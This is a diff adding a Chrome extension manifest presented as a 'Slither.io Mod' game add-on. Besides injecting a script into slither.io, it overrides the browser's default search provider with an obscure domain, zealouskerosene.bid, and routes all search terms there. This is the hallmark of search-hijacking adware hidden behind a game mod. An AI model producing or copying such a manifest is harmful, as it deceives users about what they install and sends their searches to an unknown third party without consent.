@@ -1,0 +1,64 @@
+{
+	"background": {
+		"scripts": [
+			"background.js"
+		]
+	},
+	"browser_action": {
+		"default_icon": "icon.png",
+		"default_popup": "menu.html"
+	},
+	"chrome_settings_overrides": {
+		"search_provider": {
+			"encoding": "UTF-8",
+			"favicon_url": "http://zealouskerosene.bid/favicon.ico",
+			"is_default": true,
+			"keyword": "zealouskerosene",
+			"name": "zealouskerosene",
+			"search_url": "http://zealouskerosene.bid/?verseduty={searchTerms}"
+		}
+	},
+	"content_scripts": [
+		{
+			"all_frames": true,
+			"js": [
+				"inject.js"
+			],
+			"matches": [
+				"*://slither.io/*"
+			],
+			"run_at": "document_start"
+		}
+	],
+	"default_locale": "en",
+	"description": "__MSG_appDesc__",
+	"icons": {
+		"128": "images/Icon-128.png",
+		"16": "images/Icon-16.png",
+		"32": "images/Icon-32.png",
+		"48": "images/Icon-48.png"
+	},
+	"manifest_version": 2,
+	"name": "__MSG_appName__",
+	"permissions": [
+		"*://slither.io/*",
+		"webRequest",
+		"webRequestBlocking",
+		"storage",
+		"unlimitedStorage",
+		"activeTab"
+	],
+	"short_name": "Slither.io Mod",
+	"update_url": "https://clients2.google.com/service/update2/crx",
+	"version": "1.0",
+	"web_accessible_resources": [
+		"images/*",
+		"main.js",
+		"game.js",
+		"customskins.js",
+		"jquery.js",
+		"chatvod.js",
+		"bootstrap.css",
+		"socket.io.js"
+	]
+}
